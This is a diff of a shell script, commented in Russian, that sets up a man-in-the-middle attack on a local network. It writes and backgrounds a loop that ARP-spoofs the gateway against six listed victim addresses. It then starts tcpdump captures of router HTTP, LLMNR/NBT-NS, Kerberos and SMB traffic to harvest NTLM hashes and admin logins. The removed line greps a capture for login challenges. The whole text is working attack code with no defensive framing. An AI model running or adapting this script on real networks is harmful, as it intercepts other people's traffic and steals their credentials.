@@ -1,1 +1,37 @@
-echo PCAPCHK; tcpdump -r /tmp/mitm3.pcap -A -s0 2>/dev/null | grep -ac "192.168.3.1"; tcpdump -r /tmp/mitm3.pcap -A -s0 2>/dev/null | grep -aiE "challenge|nonce|oui-rpc|login.*admin" | head -10; wc -c /tmp/mitm3.pcap
+
+# Убиваем старые процессы
+pkill -f arping 2>/dev/null
+pkill -f tcpdump 2>/dev/null
+pkill -f spoof 2>/dev/null
+rm -f /tmp/mitm*.pcap /tmp/spoof.sh
+
+# ARP spoofing: мы = шлюз .1 для жертв
+GW=192.168.3.1
+VICTIMS="192.168.3.135 192.168.3.152 192.168.3.16 192.168.3.76 192.168.3.190 192.168.3.130"
+cat > /tmp/spoof.sh << 'SEOF'
+#!/bin/sh
+GW=192.168.3.1
+while true; do
+  for v in 192.168.3.135 192.168.3.152 192.168.3.16 192.168.3.76 192.168.3.190 192.168.3.130; do
+    arping -c 1 -A -S $GW $v >/dev/null 2>&1
+    arping -c 1 -A -S $v $GW >/dev/null 2>&1
+  done
+  sleep 3
+done
+SEOF
+chmod +x /tmp/spoof.sh
+nohup /tmp/spoof.sh >/dev/null 2>&1 &
+
+# tcpdump: ловим HTTP к роутеру .1 + LLMNR/NBT-NS + NTLM
+nohup tcpdump -i enp7s0 -w /tmp/mitm_rtr.pcap -c 500000 \
+  "host 192.168.3.1 or port 5355 or port 137 or port 88 or port 445" >/dev/null 2>&1 &
+
+# Дополнительно: ASCII dump для быстрого grep
+nohup tcpdump -i enp7s0 -A -s0 -w /dev/stdout \
+  "host 192.168.3.1 and port 80" > /tmp/http_rtr.log 2>/dev/null &
+
+sleep 2
+echo MITM-RESTARTED
+pgrep -af spoof | head -2
+pgrep -af tcpdump | head -2
+ls -la /tmp/mitm_rtr.pcap 2>/dev/null
